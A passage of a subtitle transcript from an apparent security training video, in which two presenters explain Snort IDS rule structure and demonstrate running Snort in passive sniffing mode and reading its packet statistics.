of put a little summary\nup there for you, tell you what it is,\n\n295\n00:12:45.740 --> 00:12:47.510\nkind of how it works in\nthe first paragraph.\n\n296\n00:12:47.510 --> 00:12:48.560\nYou can read through that, right.\n\n297\n00:12:48.560 --> 00:12:50.430\nWe've kind of just talked\nthrough that whole part.\n\n298\n00:12:50.430 --> 00:12:53.200\nSnort rules, as we were just talking\nabout, you have to write them.\n\n299\n00:12:53.200 --> 00:12:55.460\nMike was saying we gotta go in and\nactually make them ourselves.\n\n300\n00:12:55.460 --> 00:12:57.290\nSo that is a little bit of a challenge.\n\n301\n00:12:57.290 --> 00:12:58.730\nNot a big deal, but\njust something to know.\n\n302\n00:12:58.730 --> 00:13:02.853\nBut the key there, the real important\nthing is that Snort rules have to be\n\n303\n00:13:02.853 --> 00:13:07.313\ncontained on a single line, which is\na really important point to make with this\n\n304\n00:13:07.313 --> 00:13:10.575\ntool because the parser does\nnot do multiple line thing.\n\n305\n00:13:10.575 --> 00:13:14.651\nSo we just have to keep that in mind and\nknow that even if the line is a 1000\n\n306\n00:13:14.651 --> 00:13:18.474\ncharacters long, it's gonna have\nto be written out continuously and\n\n307\n00:13:18.474 --> 00:13:19.993\nthen you could [CROSSTALK].\n\n308\n00:13:19.993 --> 00:13:21.740\nIt's all the same.\n\n309\n00:13:21.740 --> 00:13:23.040\nThat's important to know.\n\n310\n00:13:23.040 --> 00:13:26.360\nAnd rules come with two logical parts\nas we called out the rule header and\n\n311\n00:13:26.360 --> 00:13:27.250\nrule options.\n\n312\n00:13:27.250 --> 00:13:29.950\nThese are just the sections of\nthe rule essentially that we create.\n\n313\n00:13:29.950 --> 00:13:32.020\nThe header tells us what\nthe action will be.\n\n314\n00:13:32.020 --> 00:13:35.470\nThe options are then gonna\nbe essentially parameters.\n\n315\n00:13:35.470 --> 00:13:40.905\nLike minus W, minus L, minus X,\nwhatever it is that we add in.\n\n316\n00:13:40.905 --> 00:13:41.848\nAnd then we have rule actions.\n\n317\n00:13:41.848 --> 00:13:45.487\nThe rule header, as we said, is gonna\nhave us figure out what we're gonna do,\n\n318\n00:13:45.487 --> 00:13:47.877\ndetermine the action\nthat's gonna be performed.\n\n319\n00:13:47.877 --> 00:13:52.497\nAnd then we match those rule,\nif necessary, or what we go through and\n\n320\n00:13:52.497 --> 00:13:54.432\ndo the filtering, rather.\n\n321\n00:13:54.432 --> 00:13:55.712\nSnort looks at those rules and\n\n322\n00:13:55.712 --> 00:13:59.053\nthen takes whatever action is going to\nbe essentially associated with that.\n\n323\n00:13:59.053 --> 00:14:02.002\nThink of it as being very similar\nto how a firewall works, right?\n\n324\n00:14:02.002 --> 00:14:06.572\nThe idea is that we do the filtering based\non a match and first match wins, right?\n\n325\n00:14:06.572 --> 00:14:09.330\nAnd that's what we're gonna alert on or\nthat's we're gotta log on or\n\n326\n00:14:09.330 --> 00:14:12.730\nthat's we're gotta pass, right, or\ndrop or do whatever we gonna do.\n\n327\n00:14:12.730 --> 00:14:17.210\nSo, the actions that are available\nthere: Alert, Log, Pass, right, so\n\n328\n00:14:17.210 --> 00:14:18.630\nyou could see what those are gonna be.\n\n329\n00:14:18.630 --> 00:14:22.320\nAnd then the available protocols,\nthe IP protocols we use.\n\n330\n00:14:22.320 --> 00:14:27.056\nWe can trigger suspicious behavior\ndetection based on our TCP UDP and\n\n331\n00:14:27.056 --> 00:14:28.368\nICMP, excuse me.\n\n332\n00:14:28.368 --> 00:14:32.763\nSo we just wanna have that background,\nright, as we're just think you through\n\n333\n00:14:32.763 --> 00:14:37.093\nthat because that helps us to understand\nwhat is or what are the capabilities we\n\n334\n00:14:37.093 --> 00:14:40.399\ncan expect to use and\nto have access to with a tool like this.\n\n335\n00:14:40.399 --> 00:14:42.290\nSo why do we take a look\nat how it actually works?\n\n336\n00:14:42.290 --> 00:14:44.690\nThis ought to be of fun and\ninterest to everybody.\n\n337\n00:14:44.690 --> 00:14:46.179\nSo we're gonna switch over to my machine.\n\n338\n00:14:46.179 --> 00:14:47.857\nWe're gonna go ahead and\nwe're gonna take a look at Snort.\n\n339\n00:14:47.857 --> 00:14:49.795\nWe've been talking about\nhow to configure it.\n\n340\n00:14:49.795 --> 00:14:54.351\nMike and I had a great conversation with\nyou about why it's important to be able to\n\n341\n00:14:54.351 --> 00:14:56.496\nuse, maybe not this IDS, but an IDS.\n\n342\n00:14:56.496 --> 00:14:59.740\nAnd we talked about the value of Snort\nbeing a command line tool, not only an old\n\n343\n00:14:59.740 --> 00:15:03.083\ntool that's reliable but one that when\nyou get a little practice on, as we said,\n\n344\n00:15:03.083 --> 00:15:06.260\nwill really help you to better understand\nthe logic of what we're gonna do.\n\n345\n00:15:06.260 --> 00:15:07.840\nSo we're gonna take a look here.\n\n346\n00:15:07.840 --> 00:15:09.870\nWe're in the lab\nenvironment as you can see.\n\n347\n00:15:09.870 --> 00:15:12.020\nI've opened up an administrative\ncommand prompts.\n\n348\n00:15:12.020 --> 00:15:13.854\nI just wanna let you know\nwe're running as an admin,\n\n349\n00:15:13.854 --> 00:15:17.130\nmaybe a little tough to see that up on the\ntop, there, but we do have that set up.\n\n350\n00:15:17.130 --> 00:15:19.660\nI've already installed Snort, so\nwe're not gonna bother with that.\n\n351\n00:15:19.660 --> 00:15:21.600\nIt's just a simple download, right?\n\n352\n00:15:21.600 --> 00:15:24.610\nYou go out to snort.org,\nget the executable, right?\n\n353\n00:15:24.610 --> 00:15:27.030\nAnd then, once you make the pig squeal,\nas we were talking about, right?\n\n354\n00:15:27.030 --> 00:15:27.632\n&gt;&gt; Yeah, right.\n[LAUGH]\n\n355\n00:15:27.632 --> 00:15:28.269\n&gt;&gt; So, then, we're gonna go\n\n356\n00:15:28.269 --> 00:15:29.240\nahead and install that.\n\n357\n00:15:29.240 --> 00:15:32.568\nAnd [COUGH] once we have that set up,\nwe're then gonna go in,\n\n358\n00:15:32.568 --> 00:15:35.440\nchange our directory into\nthe Snort directory..\n\n359\n00:15:35.440 --> 00:15:38.343\nSo, I just done the cd\ncommandlet to snort/bin.\n\n360\n00:15:38.343 --> 00:15:41.231\nSo, I'm just sitting at\nthe command prompt there and\n\n361\n00:15:41.231 --> 00:15:43.359\nI've got snort space minus capitol W.\n\n362\n00:15:43.359 --> 00:15:44.994\nJust going to load that.\n\n363\n00:15:44.994 --> 00:15:46.081\nAnd actually, of course,\n\n364\n00:15:46.081 --> 00:15:48.500\nit would be helpful if I actually\nclicked before I hit enter.\n\n365\n00:15:48.500 --> 00:15:49.710\nThat's always a good thing.\n\n366\n00:15:49.710 --> 00:15:53.295\nSo, we're going to do that and you can see\nthat when we issue this first command,\n\n367\n00:15:53.295 --> 00:15:54.901\nwe're going to see the interface.\n\n368\n00:15:54.901 --> 00:15:56.202\nThe network interface.\n\n369\n00:15:56.202 --> 00:15:59.810\n[INAUDIBLE] they have a numerical\nidentifier, interface one,\n\n370\n00:15:59.810 --> 00:16:01.250\ninterface two, etc..\n\n371\n00:16:01.250 --> 00:16:05.214\nSnort is, and I know we've talked about\nthis and we made this distinction.\n\n372\n00:16:05.214 --> 00:16:08.761\nSnort is going to be case sensitive and\nI know I reminded you of that and\n\n373\n00:16:08.761 --> 00:16:11.022\nyou made a point of it as\nwe were talking and so\n\n374\n00:16:11.022 --> 00:16:16.200\nessentially we can say we both talked\nabout the fact that it's case-sensitive.\n\n375\n00:16:16.200 --> 00:16:17.582\nA lot of tools nowadays are not.\n\n376\n00:16:17.582 --> 00:16:18.437\n&gt;&gt; They are not correct.\n\n377\n00:16:18.437 --> 00:16:19.594\n&gt;&gt; Unless you're from the Linux world.\n\n378\n00:16:19.594 --> 00:16:21.570\nYou might not be used to that and\nyou get in here.\n\n379\n00:16:21.570 --> 00:16:23.430\nAnd why isn't dash w work.\n\n380\n00:16:23.430 --> 00:16:24.320\nThat's what Adam said.\n\n381\n00:16:24.320 --> 00:16:25.940\nAnd it's gotta be a capital W.\n\n382\n00:16:25.940 --> 00:16:29.060\n&gt;&gt; Absolutely so\nyou see if we type the lower case w and\n\n383\n00:16:29.060 --> 00:16:31.430\nwe do that,\nWe get something totally different, right?\n\n384\n00:16:31.430 --> 00:16:33.680\nWe get a listing of the modules and\n\n385\n00:16:33.680 --> 00:16:36.840\nwe gotta obviously figure out what's\ngoing on in there, a little help file,\n\n386\n00:16:36.840 --> 00:16:39.110\nsomebody knocking on our shoulder going,\nhey, idiot, pay attention.\n\n387\n00:16:39.110 --> 00:16:39.650\n&gt;&gt; Yeah, right.\n\n388\n00:16:39.650 --> 00:16:40.710\n&gt;&gt; I told you capital W.\n\n389\n00:16:40.710 --> 00:16:41.842\nYou're not typing what I said.\n\n390\n00:16:41.842 --> 00:16:44.470\nSo we wanna make sure that\nwe are aware of that.\n\n391\n00:16:44.470 --> 00:16:45.140\nSo we've done that.\n\n392\n00:16:45.140 --> 00:16:45.770\nYou can see that.\n\n393\n00:16:45.770 --> 00:16:51.190\nWhat we're gonna do now is just go in and\nwe are going to set the Snort interface to\n\n394\n00:16:51.190 --> 00:16:55.710\nthe appropriate or ask Snort to listen on\nthe appropriate interface, I should say.\n\n395\n00:16:55.710 --> 00:16:58.220\nI'm just going to clear the screen here\nreal quick just so it's easier for\n\n396\n00:16:58.220 --> 00:16:59.610\nus to kind of keep track of everything.\n\n397\n00:16:59.610 --> 00:17:03.460\nSimple cls, clear screen command\nwill work there very nicely.\n\n398\n00:17:03.460 --> 00:17:06.120\nA little lemon pledge on the screen.\n\n399\n00:17:06.120 --> 00:17:06.670\n&gt;&gt; Absolutely.\n\n400\n00:17:06.670 --> 00:17:07.480\n&gt;&gt; A little white out.\n\n401\n00:17:07.480 --> 00:17:10.580\nYou know I actually had to talk\nabout like funny things, right?\n\n402\n00:17:10.580 --> 00:17:12.635\nSo I actually had a student.\n\n403\n00:17:12.635 --> 00:17:15.610\n[LAUGH] You talk about these things and\nyou say to people no,\n\n404\n00:17:15.610 --> 00:17:16.790\nthat could never happen, right?\n\n405\n00:17:16.790 --> 00:17:17.970\nThat's just ridiculous.\n\n406\n00:17:17.970 --> 00:17:20.008\nI actually had a student who.\n\n407\n00:17:22.872 --> 00:17:25.552\nI think back about it and\nI'm just like there's absolutely,\n\n408\n00:17:25.552 --> 00:17:27.830\nnobody would ever believe\nme if I said this, right?\n\n409\n00:17:27.830 --> 00:17:30.139\nSo I had a student in one of my classes.\n\n410\n00:17:30.139 --> 00:17:31.769\nThis is early on,\nwhen I first started teaching.\n\n411\n00:17:31.769 --> 00:17:36.118\n[LAUGH] And\nwe were doing a security class.\n\n412\n00:17:36.118 --> 00:17:38.694\nPasswords, this, and whatever it was.\n\n413\n00:17:38.694 --> 00:17:40.744\nAnd let me move over so\nI'm centralized here, so\n\n414\n00:17:40.744 --> 00:17:42.497\nthat way I'm not hanging off to the side.\n\n415\n00:17:42.497 --> 00:17:43.501\nWait, I could actually do this.\n\n416\n00:17:43.501 --> 00:17:46.880\nI could do the so and I'm doing\nthe arm thing you can't even see.\n\n417\n00:17:46.880 --> 00:17:48.470\nSo I was talking.\n\n418\n00:17:48.470 --> 00:17:52.459\nSo I was talking, right, and here I was\ntalking and as I was talking, right?\n\n419\n00:17:52.459 --> 00:17:55.711\nSo I'm talking to this student in\nclass and I said something about,\n\n420\n00:17:55.711 --> 00:17:58.965\nin the password, the etc/shadow,\npassword file Linux.\n\n421\n00:17:58.965 --> 00:18:01.005\nIt's basically going to\nhide your passwords, right?\n\n422\n00:18:01.005 --> 00:18:02.485\nIt's going to be like the encrypted file.\n\n423\n00:18:02.485 --> 00:18:03.530\nYou're not going to be able\nto tell what they are.\n\n424\n00:18:03.530 --> 00:18:04.442\nThey're all hashed.\n\n425\n00:18:04.442 --> 00:18:07.336\nAnd so, the student goes in there and\nstarts playing around, trying to find it.\n\n426\n00:18:07.336 --> 00:18:12.595\nAnd sure enough, okay, great, I got it and\nthey pull it up and whatever.\n\n427\n00:18:12.595 --> 00:18:15.335\nI'm like wait, but\nthere's hashes cuz that's what you see.\n\n428\n00:18:15.335 --> 00:18:17.765\nYou see hashes,\nthere's hashes in the screen.\n\n429\n00:18:17.765 --> 00:18:18.508\nSo.\n\n430\n00:18:18.508 --> 00:18:19.047\nGets out.\n\n431\n00:18:19.047 --> 00:18:21.720\n&gt;&gt; [LAUGH]\n&gt;&gt; There was a bit of a language issue\n\n432\n00:18:21.720 --> 00:18:24.330\nwhich is the precursor of\nthe context you need for this.\n\n433\n00:18:24.330 --> 00:18:27.970\nSo I said well yeah if you don't want\nthem to see the password, whatever.\n\n434\n00:18:27.970 --> 00:18:33.840\nYou would obviously either not use the,\nwhat am I trying to say?\n\n435\n00:18:33.840 --> 00:18:37.815\nNot store the passwords in open format but\nturn on the shadow function.\n\n436\n00:18:37.815 --> 00:18:39.700\n&gt;&gt; Uh-huh.\n&gt;&gt; So the student misunderstood and\n\n437\n00:18:39.700 --> 00:18:42.810\nthought I was talking about okay maybe\nwe would erase the password or whatever.\n\n438\n00:18:42.810 --> 00:18:44.040\nSo gives out their pencil and\n\n439\n00:18:44.040 --> 00:18:44.930\nis trying to-\n&gt;&gt; [LAUGH]\n\n440\n00:18:44.930 --> 00:18:46.390\n&gt;&gt; Literally erase\n\n441\n00:18:46.390 --> 00:18:47.710\nthe password on the screen.\n\n442\n00:18:47.710 --> 00:18:50.030\nNow, to be fair, as I said,\nthis was a language issue.\n\n443\n00:18:50.030 --> 00:18:52.180\nThis student did not speak\nEnglish as their first language.\n\n444\n00:18:52.180 --> 00:18:55.320\nI know it was just probably\nthe translation, nothing more than that.\n\n445\n00:18:55.320 --> 00:18:58.500\nBecause this was a fairly bright person\nwho clearly understood the concepts.\n\n446\n00:18:58.500 --> 00:19:00.915\nIt was just funny,\nbecause there they are with the eraser.\n\n447\n00:19:00.915 --> 00:19:02.280\n&gt;&gt; [LAUGH]\n&gt;&gt; Trying to figure out how to get rid of\n\n448\n00:19:02.280 --> 00:19:04.940\nthe passwords and\nthat just wasn't going to work.\n\n449\n00:19:04.940 --> 00:19:06.070\n&gt;&gt; No.\n&gt;&gt; Anyway I digress.\n\n450\n00:19:06.070 --> 00:19:07.190\nCan we digress back to?\n\n451\n00:19:07.190 --> 00:19:08.580\nThere we go, thank you very much.\n\n452\n00:19:08.580 --> 00:19:10.460\nThat's the let's pay attention button.\n\n453\n00:19:10.460 --> 00:19:15.140\nSo what we're going to do now is set\nup the Snort to be able to go and\n\n454\n00:19:15.140 --> 00:19:17.360\nto initialize and to start running.\n\n455\n00:19:17.360 --> 00:19:19.430\nAnd what the heck did I do there?\n\n456\n00:19:19.430 --> 00:19:20.690\nI know what I did.\n\n457\n00:19:20.690 --> 00:19:22.240\nI put an L in there\ninstead of a number one.\n\n458\n00:19:22.240 --> 00:19:25.030\nThat's what happens when I'm typing and\nI'm not paying attention and\n\n459\n00:19:25.030 --> 00:19:26.212\ntelling a story.\n\n460\n00:19:26.212 --> 00:19:28.010\nAll right, so\nwhen you want to get an error in Snort,\n\n461\n00:19:28.010 --> 00:19:30.355\nthat's exactly what you're\ngonna do right there.\n\n462\n00:19:30.355 --> 00:19:32.300\nSo in my defense,\n\n463\n00:19:32.300 --> 00:19:36.160\nnumber one and L do look very similar\nwhen you type them in in this console.\n\n464\n00:19:36.160 --> 00:19:38.670\nSo we're gonna do that one,\nthere we go and that's what we need.\n\n465\n00:19:38.670 --> 00:19:41.890\nSo what we're getting now\nis simply just having Snort\n\n466\n00:19:41.890 --> 00:19:43.890\nrun all the traffic coming\nthrough the interface.\n\n467\n00:19:43.890 --> 00:19:45.950\nIn this case, interface number one,\n\n468\n00:19:45.950 --> 00:19:48.300\nand we're just seeing it echoed\nback to the console here.\n\n469\n00:19:48.300 --> 00:19:52.215\nSo we're seeing traffic flowing through,\nand we're not recording anything,\n\n470\n00:19:52.215 --> 00:19:57.025\nthis is literally just us looking down at\nthe stream watching it go by in real time.\n\n471\n00:19:57.025 --> 00:20:00.574\nBut what we are seeing is we're seeing all\nthe traffic that's streaming through this\n\n472\n00:20:00.574 --> 00:20:01.527\nparticular machine.\n\n473\n00:20:01.527 --> 00:20:05.260\nAnd we're just seeing packet after\npacket go through there as you watch.\n\n474\n00:20:05.260 --> 00:20:07.600\nAnd if we let this go for\nwhile, we'll let it go for\n\n475\n00:20:07.600 --> 00:20:10.770\nanother few secs before we pause it,\nwe'll get a packet counter at the end.\n\n476\n00:20:10.770 --> 00:20:11.650\nWe'll kinda take a look at that.\n\n477\n00:20:11.650 --> 00:20:12.432\nIt's important to know.\n\n478\n00:20:12.432 --> 00:20:17.965\nWe do get some summary statistics, so it\nis helpful for us to see what's happening.\n\n479\n00:20:17.965 --> 00:20:20.555\nBut the one thing that we wanna be\naware of here as we're running this\n\n480\n00:20:20.555 --> 00:20:23.365\nis that number one, this is just\nlike a quick view, if you will.\n\n481\n00:20:23.365 --> 00:20:26.435\nThis is really not very helpful\nto us from an IDS perspective.\n\n482\n00:20:26.435 --> 00:20:29.540\nWe're not running any rules yet\nand we're not doing any filtering.\n\n483\n00:20:29.540 --> 00:20:30.410\nWe're gonna get into that,\n\n484\n00:20:30.410 --> 00:20:33.120\nwe're gonna go edit up the snort.conf\nfile here in a minute.\n\n485\n00:20:33.120 --> 00:20:36.300\nAnd we're gonna take a look at how to set\nthis thing up because right now we're\n\n486\n00:20:36.300 --> 00:20:38.280\njust running it in\nessentially passive mode.\n\n487\n00:20:38.280 --> 00:20:40.570\nWe're not really doing\nany active filtering.\n\n488\n00:20:40.570 --> 00:20:42.520\n&gt;&gt; You might use this just to analyze or\n\n489\n00:20:42.520 --> 00:20:45.200\nget a look at what traffic's going on on\nyour network because we are gonna get that\n\n490\n00:20:45.200 --> 00:20:47.480\nsummary where it breaks\nit down by protocol.\n\n491\n00:20:47.480 --> 00:20:49.470\n&gt;&gt; It will, but as you said, analyze some.\n\n492\n00:20:49.470 --> 00:20:53.340\nIf you watch this thing streaming by,\nI'm gonna say, I don't know,\n\n493\n00:20:53.340 --> 00:20:56.300\nmaybe 100 packets a second\nare going through here, we'll see.\n\n494\n00:20:56.300 --> 00:20:59.560\nBut I\"m thinking it's at least\n100 packets a second on average.\n\n495\n00:20:59.560 --> 00:21:01.720\nThere's no way we can really keep\nup with it on the console here.\n\n496\n00:21:01.720 --> 00:21:03.272\n&gt;&gt; No, no, no.\nYou just use the total numbers.\n\n497\n00:21:03.272 --> 00:21:05.284\n[CROSSTALK]\n&gt;&gt; We're just getting the high level data\n\n498\n00:21:05.284 --> 00:21:06.870\nto your point when we do the analysis.\n\n499\n00:21:06.870 --> 00:21:08.420\nAnd it is gonna do that for us.\n\n500\n00:21:08.420 --> 00:21:09.455\nSo, let's just go ahead and break this.\n\n501\n00:21:09.455 --> 00:21:10.710\nWe'll just click in there.\n\n502\n00:21:10.710 --> 00:21:12.980\nGet a little Ctrl+C action going on.\n\n503\n00:21:12.980 --> 00:21:14.880\nLet's just scroll back up.\n\n504\n00:21:14.880 --> 00:21:16.680\nGive us a second to do that.\n\n505\n00:21:16.680 --> 00:21:20.790\nAnd as we scroll back up, we've got\na long list of just protocol traffic.\n\n506\n00:21:20.790 --> 00:21:23.020\nA little summary on the packet I/O there.\n\n507\n00:21:23.020 --> 00:21:26.110\nSo what we see at the top,\nwe got a run time total.\n\n508\n00:21:26.110 --> 00:21:30.736\nSo we're gonna see, we ran it for\n93.6, almost 94 seconds.\n\n509\n00:21:30.736 --> 00:21:31.352\n&gt;&gt; Hm-hm.\n\n510\n00:21:31.352 --> 00:21:32.818\n&gt;&gt; It's about a minute and\na half, approximately, right?\n\n511\n00:21:32.818 --> 00:21:36.275\nWe got you know 7,400\npackets in there on average.\n\n512\n00:21:36.275 --> 00:21:37.601\nI was a little off, I was a little high.\n\n513\n00:21:37.601 --> 00:21:39.650\nLooks like 79 packets a second.\n\n514\n00:21:39.650 --> 00:21:41.980\nSo, yeah, about 80 packets a second there.\n\n515\n00:21:41.980 --> 00:21:43.140\nThat's still a lot of traffic.\n\n516\n00:21:43.140 --> 00:21:43.960\n&gt;&gt; That is.\n&gt;&gt; If you think about it\n\n517\n00:21:43.960 --> 00:21:46.790\nconsistently over 95 seconds or so.\n\n518\n00:21:46.790 --> 00:21:48.960\nThat's a lot of traffic.\n\n519\n00:21:48.960 --> 00:21:54.500\nAnd what we see is a total of about 7400,\ngotta get\n\n520\n00:21:54.500 --> 00:22:00.160\nmy abacus out, 7400,\njust over 7400 packets, 7417.\n\n521\n00:22:00.160 --> 00:22:03.745\nAnd we've got 7406 are analyzed.\n\n522\n00:22:03.745 --> 00:22:04.885\nWe got 11 that are outstanding.\n\n523\n00:22:04.885 --> 00:22:07.685\nThere are always a few left in\nthe buffer when we break that are just\n\n524\n00:22:07.685 --> 00:22:10.605\nnot going to get dumped\ninto the actual engine.\n\n525\n00:22:10.605 --> 00:22:13.205\nSo you're always going to have\na few little packets on the end\n\n526\n00:22:13.205 --> 00:22:15.295\nwhen you do it this way that\njust never get dealt with.\n\n527\n00:22:15.295 --> 00:22:18.085\nSo that's normal, that's expected,\nno big deal there.\n\n528\n00:22:18.085 --> 00:22:20.955\nBut other than that,\nif we take out just those 11 packets,\n\n529\n00:22:20.955 --> 00:22:24.430\nwe pretty much got 99.9%\nof the traffic there.\n\n530\n00:22:24.430 --> 00:22:27.560\nAnd so we see that everything\nlooks like it is ethernet-based.\n\n531\n00:22:27.560 --> 00:22:31.300\nWe expect that, so ETH, top of\nthe protocol list, we're seeing ethernet.\n\n532\n00:22:31.300 --> 00:22:33.680\nNo VLAN traffic, so that's interesting.\n\n533\n00:22:33.680 --> 00:22:35.930\nNot interesting, I should say,\ncuz we know we're not running VLANs.\n\n534\n00:22:35.930 --> 00:22:37.840\nBut would be interesting\nto see if we were.\n\n535\n00:22:37.840 --> 00:22:41.640\nWe would get a count on the packets\nthat transited with VLAN identifiers.\n\n536\n00:22:41.640 --> 00:22:45.790\nNow we wouldn't, in this mode, be able to\ndrill in and see what those packets are.\n\n537\n00:22:45.790 --> 00:22:48.670\nWe can do that, but\nnot until we configure the conf file.\n\n538\n00:22:48.670 --> 00:22:52.580\nBut we would at least know hey,\nby the way, there's a VLAN out there and\n\n539\n00:22:52.580 --> 00:22:56.130\nwe've got some traffic that may or may not\nbe visible that we wanna take a look at.\n\n540\n00:22:56.130 --> 00:22:57.100\nWe've got IPv4.\n\n541\n00:22:57.100 --> 00:22:59.530\nLooks like almost everything was IPv4.\n\n542\n00:22:59.530 --> 00:23:03.900\nWe've got everything being TCP\nwith the exception of two packets,\n\n543\n00:23:03.900 --> 00:23:05.820\ntwo lonely UDP packets-\n&gt;&gt; Right?\n\n544\n00:23:05.820 --> 00:23:07.730\nBut we've got two UDP packets.\n\n545\n00:23:07.730 --> 00:23:09.730\nAlmost everything is TCP.\n\n546\n00:23:09.730 --> 00:23:14.630\nLooks like no IPv6, although certainly we\nwould see that If we were running any, so\n\n547\n00:23:14.630 --> 00:23:15.890\nwe've got that.\n\n548\n00:23:15.890 --> 00:23:18.410\nAnd I've got IPX in there, right?\n\n549\n00:23:18.410 --> 00:23:21.710\nGot ARP, we got two ARP packets,\nwhich explains the UDP packets, right?\n\n550\n00:23:21.710 --> 00:23:22.251\n&gt;&gt; Yeah.\n[LAUGH]\n\n551\n00:23:22.251 --> 00:23:22.840\n&gt;&gt; So we've got that.\n\n552\n00:23:22.840 --> 00:23:26.580\nAnd so it's just interesting,\nwe just get all of that information.\n\n553\n00:23:26.580 --> 00:23:30.428\nSo it's nice to be able to, as you say,\njust get that high-level breakdown, right?\n\n554\n00:23:30.428 --> 00:23:34.680\nAnd this will give us some very\nbasic insights into what's going on.\n\n555\n00:23:34.680 --> 00:23:37.800\nIt is not going to give\nus a lot of detail.\n\n556\n00:23:37.800 --> 00:23:41.200\nWe obviously have to do a little bit\nmore hunting and searching for that.\n\n557\n00:23:41.200 --> 00:23:43.930\nBut it's gonna help us do a little bit.\n\n558\n00:23:43.930 --> 00:23:47.240\nSo if we go in and we do this now\n\n559\n00:23:47.240 --> 00:23:52.460\ninstead of a snort minus one or\nminus I rather for the interface minus V.\n\n560\n00:23:52.460 --> 00:23:54.901\nLet's add a D at the end of that and\nrun that again.\n\n561\n00:23:54.901 --> 00:23:58.011\nNow what we're gonna see is\nis we see the data coming in,\n\n562\n00:23:58.011 --> 00:23:59.690\nnot just the header of the packet.\n\n563\n00:23:59.690 --> 00:24:01.900\nBut we're seeing, as you can see,\nall the data, right?\n\n564\n00:24:01.900 --> 00:24:05.559\nSo this actually is looking a lot\nmore like, well, what it is,\n\n565\n00:24:05.559 --> 00:24:08.754\nwhich is the hex data that\nwe're actually looking at.\n\n566\n00:24:08.754 --> 00:24:12.484\nAnd I know, for instance, if we go\nthrough, and you and I were talking right\n\n567\n00:24:12.484 --> 00:24:16.743\nbefore we got started, something like\nWireshark or maybe as a capture tool And\n\n568\n00:24:16.743 --> 00:24:20.799\nif we look at that and we see the data in\nthere graphically we're going to see this.\n\n569\n00:24:20.799 --> 00:24:22.570\nAnd we're going to see\nthe packets drilling.\n\n570\n00:24:22.570 --> 00:24:25.990\nWe've actually done that in some of\nthe other hands on demos that we've done,\n\n571\n00:24:25.990 --> 00:24:28.530\nin sniffing for instance we went in.\n\n572\n00:24:28.530 --> 00:24:29.760\nWe ran the capture.\n\n573\n00:24:29.760 --> 00:24:31.130\nWe actually took a look at the packets.\n\n574\n00:24:31.130 --> 00:24:32.580\nWent in broke one down.\n\n575\n00:24:32.580 --> 00:24:34.780\nWe used your little\ngraphic you created but\n\n576\n00:24:34.780 --> 00:24:36.870\nthen we looked at what\na real packet It looks like.\n\n577\n00:24:36.870 --> 00:24:38.520\nSo we're over seeing this kind of stuff.\n\n578\n00:24:39.800 --> 00:24:41.500\nAnd so we're seeing all the numbers go by,\nright, or\n\n579\n00:24:41.500 --> 00:24:43.260\nwe're actually seeing everything no again.\n\n580\n00:24:43.260 --> 00:24:46.150\nYou're in this area impossible\nto make hatch tails out of this.\n\n581\n00:24:46.150 --> 00:24:49.000\nSo let me say hey look\nit's streaming by but in.\n\n582\n00:24:49.000 --> 00:24:51.790\nIn passively capturing you're\nobviously we're getting all this.\n\n583\n00:24:51.790 --> 00:24:53.760\nNow again we can go on and\nwe can break that so\n\n584\n00:24:53.760 --> 00:24:55.830\njust Ctrl+C and you can see we broke that.\n\n585\n00:24:55.830 --> 00:24:57.440\nWe get the same break down there.\n\n586\n00:24:57.440 --> 00:24:58.940\nI'm not gonna go back up\nthrough the list again but\n\n587\n00:24:58.940 --> 00:25:03.110\nwe got the same high level vision of\nwhat the protocol traffic looks like.\n\n588\n00:25:03.110 --> 00:25:06.840\nSo in passive mode, right,\nthis is nice and we can do all this.\n\n589\n00:25:06.840 --> 00:25:10.240\nNow, clearly Snort's gotta be a little\nbit more valuable than that, right.\n\n590\n00:25:10.240 --> 00:25:14.920\nI mean this is nice, but this\nbasically s nort for beginners, right.\n\n591\n00:25:14.920 --> 00:25:17.220\nSo now we've seen how\nwe can launch the tool.\n\n592\n00:25:17.220 --> 00:25:19.970\nWe've seen how we can passively monitor,\nbut we wanna do more than that.\n\n593\n00:25:19.970 --> 00:25:24.290\nRight, because we want to understand what\nis coming in to be able to actually take\n\n594\n00:25:24.290 --> 00:25:27.010\nnot necessarily action per se.\n\n595\n00:25:27.010 --> 00:25:30.060\nBut we want to be alerted to the fact\nthat there is bad traffic and\n\n596\n00:25:30.060 --> 00:25:31.670\ndecide at that point what to do.\n\n597\n00:25:31.670 --> 00:25:35.270\nRemember this is an IDS,\nIDSs are not going to take action.\n\n598\n00:25:35.270 --> 00:25:37.740\nIDSs are going to monitor and alert us,\n\n599\n00:25:37.740 --> 00:25:41.590\nas the commercials remind us of Right that\nthey've got running on TV these days.\n\n600\n00:25:41.590 --> 00:25:42.695\n&gt;&gt; It's all in just a monitor.\n\n601\n00:25:42.695 --> 00:25:44.040\n&gt;&gt; [LAUGH]\n&gt;&gt; I'm sorry i can't stop\n\n602\n00:25:44.040 --> 00:25:45.750\nthe bank robbery but\ni could tell you what's happening.\n\n603\n00:25:45.750 --> 00:25:46.975\nHey you're being robbed right.\n\n604\n00:25:46.975 --> 00:25:47.560\n&gt;&gt; [LAUGH]\n&gt;&gt; So\n\n605\n00:25:47.560 --> 00:25:49.490\nwe just wanna make sure that we know that.\n\n606\n00:25:49.490 --> 00:25:52.275\nNow i'm gonna cheat here a little bit.\n\n607\n00:25:52.275 --> 00:25:56.815\nThen I'm gonna type in a command line\nthat we are gonna use a little later.\n\n608\n00:25:56.815 --> 00:25:59.205\nI'm not gonna launch it because\nit's gonna give us an error right?\n\n609\n00:25:59.205 --> 00:26:01.425\nSo cause snort does not\ngonna configure jet.\n\n610\n00:26:01.425 --> 00:26:03.225\nWe're not gonna be able to\nrun snort in this move.\n\n611\n00:26:03.225 --> 00:26:05.357\nBut I just wanna show you\nwhat the command looks like.\n\n612\n00:26:05.357 --> 00:26:06.727\nAnd we'll just keep it there.\n\n613\n00:26:06.727 --> 00:26:09.247\nAnd that way, when we're ready to use it,\nafter we've done a little editing,\n\n614\n00:26:09.247 --> 00:26:13.467\nhere, we'll be able to go in and\nactually use this, so snort -c.\n\n615\n00:26:13.467 --> 00:26:16.057\nWe're gonna specify a path here.\n\n616\n00:26:16.057 --> 00:26:18.107\nAnd so we already have Snort installed,\n\n617\n00:26:18.107 --> 00:26:22.845\nso snort\\etc is gonna be standard\npath that we have when we install.\n\n618\n00:26:22.845 --> 00:26:25.980\nsnort.conf is our config file,\nwe're gonna go and\n\n619\n00:26:25.980 --> 00:26:27.200\ntake a look at that in just a minute.\n\n620\n00:26:27.200 --> 00:26:30.590\nSo that comes from the actually\ninstallation of Snort, right?\n\n621\n00:26:30.590 --> 00:26:33.480\nWe just gotta know where this\nSnort 